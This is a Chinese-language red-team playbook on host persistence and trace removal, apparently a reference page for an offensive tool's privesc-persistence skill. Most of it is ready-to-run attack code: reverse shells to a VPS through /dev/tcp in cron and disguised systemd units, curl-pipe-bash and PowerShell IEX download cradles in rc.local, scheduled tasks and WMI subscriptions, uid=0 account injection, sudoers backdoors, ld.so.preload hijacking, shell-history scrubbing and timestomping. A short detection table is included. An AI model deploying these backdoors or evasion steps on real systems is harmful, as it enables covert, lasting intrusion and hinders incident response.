# 主机持久化与痕迹清除：每条入口的落地位置、存活判据、留痕

> 被 `privesc-persistence` 引用。判据只有一条：**主动断开所有会话、重启目标、
> 再用维持入口连一次**——连不上就等于没做。其余都是"当前会话还在"。
>
> 为什么单独成文：技能正文的持久化只有一张 5 行表格，而实际要选的位置有 12 类，
> 每类的存活条件、隐蔽性、留痕完全不同。选错位置的代价是"重启即失"，
> 而那时候你已经在打下一台了。
>
> 本文按「入口类型」组织（你是 WebShell 进来的还是命令执行进来的，决定能落哪些位置），
> 不按"Windows/Linux"分——同一台机器上你可能有多种入口。

## 〇、先想清楚三件事，再动手

| 问题 | 为什么必须先答 | 答错的后果 |
| --- | --- | --- |
| **目标是长驻还是短打？** | 长驻必须至少落两个异质入口（文件 + 计划任务/服务），单入口被杀就全丢 | 短打却落了一堆位置 → 留痕过多，被溯源 |
| **重启后我要什么？** | 要 shell / 要回连 / 只要内网可达性——三种目标落点不同 | 落了 WebShell 但目标重启后 Web 服务不启动 → 白做 |
| **这条路被清了我怎么知道？** | 留一个"存活心跳"（DNS/HTTP 回连），否则被清了你还在等 | 以为还在，实际早被清，浪费一整轮 |

**双入口原则**：任何单点持久化都不算持久化。文件马 + 系统级任务（cron/systemd/schtasks）
是最小组合；两者落在**不同机制**上（一个靠 Web 服务加载，一个靠系统调度），
运维清掉一个另一个还在。

---

## 一、入口类型决定落哪些位置

| 你的入口 | 能落的位置（按隐蔽性） | 不能落的 | 说明 |
| --- | --- | --- | --- |
| **WebShell**（有文件写） | 1. 马本身（多份异路径/异后缀）<br>2. Web 容器自启配置（Tomcat `web.xml`/`context.xml`、nginx `conf.d`、Apache `httpd.conf`、PHP `.user.ini`）<br>3. 计划任务回连<br>4. 内存马（作为隐蔽主入口，**必须配文件马兜底**） | 需要 root/SYSTEM 的位置 | Web 服务的用户权限决定了能改哪些容器配置 |
| **命令执行**（无文件写） | 1. 计划任务/服务回连<br>2. 账号（本地管理员/uid=0）<br>3. SSH key（Linux） | 文件马（没写权限） | 命令执行往往只能落在系统级调度上 |
| **高权限**（root/SYSTEM） | 全部位置可用 | — | 优先选隐蔽性高的（WMI 订阅 / systemd timer / 服务） |
| **容器内 root** | **必须在宿主机落**（容器重建即归零） | 容器内任何位置 | 容器内持久化是最常见的自欺 |

---

## 二、Linux 持久化：六个位置，按隐蔽性排序

### 2.1 SSH authorized_keys（最稳，最易查）

```bash
# 落地
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-ed25519 AAAA... attacker@vps" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 存活判据：断开所有会话，用私钥重新连一次
ssh -i /path/to/key user@target

# 隐蔽变体：不开新账号，追加到已有用户的 keys（不新建用户 = 少一条 4688 等价物）
```

**为什么排第一**：不依赖任何服务重启、任何调度机制，只要 sshd 在跑就一直有效。
**留痕**：`authorized_keys` 文件 mtime 变化 + 登录日志（`/var/log/auth.log` 的 `Accepted publickey`）。
**反例**：`echo >>` 时用错了用户（当前 shell 是 www-data，你写的是 www-data 的 keys，
但目标只允许 root 登录）→ 看起来写了，实际连不上。

### 2.2 cron / cron.d（最通用，最容易写错）

```bash
# 用户级（最稳：不依赖 root，不受 cron.d 权限限制）
(crontab -l 2>/dev/null; echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/VPS/443 0>&1'") | crontab -

# 系统级（需 root，更隐蔽：不在用户 crontab 里）
echo "*/10 * * * * root curl -s http://VPS/x.sh | bash" > /etc/cron.d/sys-update
chmod 644 /etc/cron.d/sys-update
```

**存活判据**：等至少一个周期（`*/10` → 等 10 分钟），看 VPS 监听有没有新连接。
**留痕**：`/etc/cron.d/` 新文件、`crontab -l` 内容变化、`CRON` 会话的 syslog 记录。
**坑**：
- `cron.d` 文件**必须**有末尾换行，否则 cron 静默忽略（看起来配置对了就是不跑）。
- 文件名不能含 `.`（`sys.update` 会被跳过）。
- 容器里 cron 常没跑（PID 1 不是 cron）→ 容器内 cron 一律无效。

### 2.3 systemd（最隐蔽的 Linux 位置）

```bash
# 服务 + timer 组合：比 cron 隐蔽（不在 crontab 里，看不出异常）
cat > /etc/systemd/system/systemd-network-helper.service <<'EOF'
[Unit]
Description=Network Helper
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/VPS/443 0>&1'
EOF
cat > /etc/systemd/system/systemd-network-helper.timer <<'EOF'
[Unit]
Description=Network Helper Timer
[Timer]
OnBootSec=5min
OnUnitActiveSec=10min
[Install]
WantedBy=timers.target
EOF
systemctl daemon-reload && systemctl enable --now systemd-network-helper.timer
```

**为什么隐蔽**：服务名贴近系统服务（`systemd-network-*`），`ps` 里看不出异常，
`crontab -l` 干净。**留痕**：`/etc/systemd/system/` 新 unit、`systemctl list-timers` 多一条。
**坑**：`enable` 了但没 `daemon-reload` → 不生效；只 `enable` 没 `start` → 要等下次开机。

### 2.4 /etc/rc.local、profile.d、bashrc

```bash
# 最不隐蔽但兼容性最好（老系统/精简系统没有 systemd 时用）
echo 'curl -s http://VPS/x.sh | bash &' >> /etc/rc.local
# 或（每次登录触发，重启不一定触发）
echo '(curl -s http://VPS/x.sh | bash &) 2>/dev/null' >> /etc/profile.d/zz-sys.sh
```

**判据差异**：`rc.local` 是开机触发（重启才验证）；`profile.d` 是登录触发
（要**新开一次登录会话**才验证）。两者不能混着验。

### 2.5 账号持久化（最直白，最容易发现）

```bash
# uid=0 的隐形 root（注意：uid 相同但用户名不同，很多审计只看用户名会漏）
echo 'sysbackup:x:0:0:sysbackup:/root:/bin/bash' >> /etc/passwd
# 或者直接设密码（需要能写 shadow）
echo 'sysbackup:$6$...:' >> /etc/shadow

# 更隐蔽：只加 sudoers（不需要新账号）
echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/sys-update
```

**留痕**：`/etc/passwd` mtime、`/etc/sudoers.d/` 新文件 —— 这两个是运维日常就会看的。
**建议**：只在"必须长期保留一个备用入口"时用，且账号名必须像业务账号。

### 2.6 动态链接库劫持 / 二进制替换（最隐蔽，最高风险）

```bash
# 找会被 root 定期执行、且依赖可写目录的二进制
ldd /usr/bin/some-root-cron-binary | grep -v "=> /"
# 或用 LD_PRELOAD（写 /etc/ld.so.preload，全局生效）
echo "/tmp/evil.so" > /etc/ld.so.preload
```

**为什么单独列**：这是唯一"不新增任何调度条目"的位置，`crontab`/`systemd`/`passwd` 全都干净。
**风险**：写坏了会导致**全局命令崩溃**（包括 ssh/scp 本身）→ 失去访问。必须先在测试机验证 `.so`。

---

## 三、Windows 持久化：六个位置

### 3.1 计划任务（最通用）

```bat
:: 每 10 分钟回连一次（隐藏：不弹窗、以 SYSTEM 跑）
schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\UpdateCheck" ^
  /tr "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://VPS/x.ps1')\"" ^
  /sc minute /mo 10 /ru SYSTEM /rl HIGHEST /f

:: 验证：立刻跑一次（不等 10 分钟）
schtasks /run /tn "Microsoft\Windows\UpdateOrchestrator\UpdateCheck"
```

**为什么用系统任务目录名**：`\Microsoft\Windows\UpdateOrchestrator\` 下全是系统任务，
`schtasks /query` 默认列表里混着看不出来。**留痕**：4698（任务创建）+ 106（TaskScheduler 日志）。
**坑**：
- `/ru SYSTEM` 需要管理员权限；没有就 `/ru %USERNAME%`（但重启后可能因未登录不跑）。
- 引号嵌套三层以上时 `schtasks` 静默失败 → 改用 `xml` 导入（`schtasks /create /xml`）。

### 3.2 服务（最稳，最容易被 7045 抓到）

```bat
sc create SysUpdateSvc binPath= "C:\Windows\Temp\svc.exe" start= auto DisplayName= "System Update Service"
sc description SysUpdateSvc "Provides system update checks."
sc start SysUpdateSvc
```

**留痕**：**7045**（服务安装）—— 这是最容易被 SIEM 抓的一条，几乎必告警。
**建议**：只在"反正已经被发现"的场景用；隐蔽场景用 WMI 订阅。

### 3.3 WMI 事件订阅（最隐蔽，无文件）

```powershell
# 永久事件消费者：系统启动 5 分钟后触发
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
  Name='SysHealthFilter'; EventNamespace='root\cimv2'
  QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System" AND TargetInstance.SystemUpTime >= 300'
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
  Name='SysHealthConsumer'
  CommandLineTemplate='powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://VPS/x.ps1'')"'
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}
```

**为什么最隐蔽**：**不落文件、不建服务、不改注册表 Run 键**，`schtasks`/`sc query`/`msconfig` 全干净。
**留痕**：Sysmon 19/20/21（WMI 事件订阅）+ `Get-WmiObject -Namespace root\subscription -Class __EventFilter`。
**坑**：WMI 仓库损坏会导致系统反复重启 → 必须在测试机验证查询语句。

### 3.4 注册表 Run 键 / Winlogon（经典但显眼）

```bat
:: 当前用户（HKCU 不需要管理员，重启后用户登录即触发）
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SysUpdate /t REG_SZ /d "C:\Windows\Temp\x.exe" /f

:: 机器级（需要管理员）
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SysUpdate /t REG_SZ /d "C:\Windows\Temp\x.exe" /f

:: Winlogon（更隐蔽一点，登录时由系统进程加载）
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\x.exe" /f
```

**留痕**：Sysmon 13（注册表设置）+ Autoruns 能列全。**建议**：只在应急时用（最容易被查）。

### 3.5 服务 DLL 劫持 / 侧加载（最隐蔽的 Windows 位置之一）

```bat
:: 找一个以 SYSTEM 跑、且 DLL 搜索路径含可写目录的服务
:: 常见目标：缺 DLL 的服务（procmon 过滤 NAME NOT FOUND + 路径可写）
```

原理：服务 exe 加载 `foo.dll` 时，Windows 按搜索顺序找，若某可写目录排在
System32 之前（少见）或该 DLL **根本不存在**（最常见），放入同名 DLL 即被加载。

**为什么少见但值钱**：不新增服务、不改 Run 键、任务列表干净。
**判据**：用 Procmon 观察 `Result = NAME NOT FOUND` 且路径可写。
**风险**：DLL 写坏会导致服务起不来 → 目标业务中断。

### 3.6 账号持久化

```bat
net user sysbackup P@ssw0rd! /add /comment:"System Backup Account" /expires:never
net localgroup administrators sysbackup /add
:: 更隐蔽：只加进 Remote Desktop Users（能 RDP 但不能改系统）
net localgroup "Remote Desktop Users" sysbackup /add
```

**留痕**：4720（用户创建）+ 4732（加组）。**建议**：账号名必须像业务账号，别用 test/hack/backup123。

---

## 四、痕迹清除：清什么、别清什么

**核心原则**：清除动作本身**就是最强的告警信号**。1102（日志被清）在几乎所有 SIEM 里
都是 P1 告警，比留下痕迹更糟。所以——

> **演练场景下默认不清痕**。真需要清理时，只清"你自己产生的临时文件"，
> 绝不碰系统日志。

### 4.1 该清的（低风险）

```bash
# Linux：自己落地的载荷、临时文件、命令历史里的自己那几行
rm -f /tmp/payload /tmp/x.sh
sed -i '/curl -s http:\/\/VPS/d' ~/.bash_history

# Windows：自己落地的 exe、临时目录、PowerShell 历史
del C:\Windows\Temp\x.exe
del %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### 4.2 不该清的（清 = 自曝）

| 动作 | 日志/事件 | 为什么不能清 |
| --- | --- | --- |
| `wevtutil cl Security` | **1102**（审计日志被清） | 最高级别告警，几乎所有 SOC 立即响应 |
| `Clear-EventLog` | 同上 | 同上 |
| `rm /var/log/auth.log` | 日志断裂 | 文件缺失本身被发现（logrotate 期望它存在） |
| `/etc/ld.so.preload` 用完不删 | 全局影响 | 留着会导致后续所有命令异常，反而暴露 |
| 改 `utilman.exe` 不还原 | 文件完整性 | 运维/EDR 日常检查就会命中 |

### 4.3 时间戳对齐（唯一的"合法"隐蔽手段）

如果确实要让落地文件不显眼，改时间戳比删日志安全得多：

```powershell
# Windows：把落地文件时间改成与同目录其他文件一致
(Get-Item C:\Windows\Temp\x.exe).CreationTime = (Get-Item C:\Windows\Temp\other.log).CreationTime
(Get-Item C:\Windows\Temp\x.exe).LastWriteTime = (Get-Item C:\Windows\Temp\other.log).LastWriteTime
```

```bash
# Linux：touch -r 参照文件
touch -r /usr/bin/ls /tmp/payload
```

**局限**：`$MFT` 里的 `$STANDARD_INFORMATION` 改了，但 `$FILE_NAME` 属性还留着原始时间。
用 `timestomp` 类工具能改前者，后者几乎改不掉 → **取证时仍能发现**。别以为改了时间就隐形了。

---

## 五、验证清单（做完必须逐条过）

做完持久化，**不要口头宣布"已维持"**。按这个清单逐条验，每条都要有输出留证：

```markdown
- [ ] 断开当前所有会话（`net use * /del`、关掉 WebShell 页面、kill 隧道）
- [ ] 用维持入口重新连一次（不是复用旧连接）
- [ ] 重启目标（`shutdown /r /t 0` 或 `reboot`）——**这一步大多数人跳过**
- [ ] 重启后等至少一个调度周期（cron 10 分钟 / systemd timer / schtasks）
- [ ] 确认入口仍然可用
- [ ] 确认第二个异质入口也仍然可用（双入口原则）
- [ ] 记录：入口位置、落地时间、验证时间、验证方式 → `redteam_webshell_add` / `redteam_attack_file_add`
```

**只有第 3 步（真的重启）跑过，"持久化成功"才算成立**。跳过重启的验证只是
"当前会话还有效"——那不叫持久化。

---

## 六、检测视角

| 位置 | 日志源 | 信号 | 噪声 |
| --- | --- | --- | --- |
| SSH keys | auth.log `Accepted publickey` + 文件 mtime | 新 key 出现 | 低（干净） |
| cron | syslog `CRON` + 文件创建 | `/etc/cron.d/` 新文件 | 中 |
| systemd | journal `Started ...` | 新 unit + `list-timers` 多一条 | 低 |
| schtasks | 4698 + TaskScheduler 106 | 新任务在非标准路径 | 中 |
| 服务 | **7045** | 服务安装（几乎必告警） | 高 |
| WMI 订阅 | Sysmon 19/20/21 | `__FilterToConsumerBinding` 创建 | **低（最隐蔽）** |
| Run 键 | Sysmon 13 | 注册表 Run 项变更 | 中 |
| 账号 | 4720 + 4732 | 新用户 + 加管理员组 | 高 |
| 日志清除 | **1102** | 审计日志被清 | 极高（必响应） |

---

## 七、常见坑

1. **容器内持久化 = 白做**。容器重建后一切归零，必须在宿主机落。
2. **cron.d 文件末尾必须有换行**，否则静默不执行（配置看着完全正常）。
3. **systemd `enable` 后没 `daemon-reload`** → 不生效。
4. **`schtasks /ru SYSTEM` 但没有管理员权限** → 任务创建成功但不会以 SYSTEM 跑。
5. **改了时间戳但没改 `$FILE_NAME`** → 取证仍能发现，别当隐形。
6. **`wevtutil cl` 是最坏的选择**：1102 告警比任何痕迹都显眼。
7. **只验"当前会话"不验"重启后"** → 最常见的自欺。必须真重启一次。
8. **单入口当持久化** → 运维 kill 一次就全丢，且你不会知道（没留心跳）。
9. **WebShell 多份备份必须不同路径 + 不同后缀**，同目录同后缀一次 `rm -rf` 全没。
10. **改了服务 exe 不还原** → 留下永久后门 = 事故，报告里必须写原值以便回滚。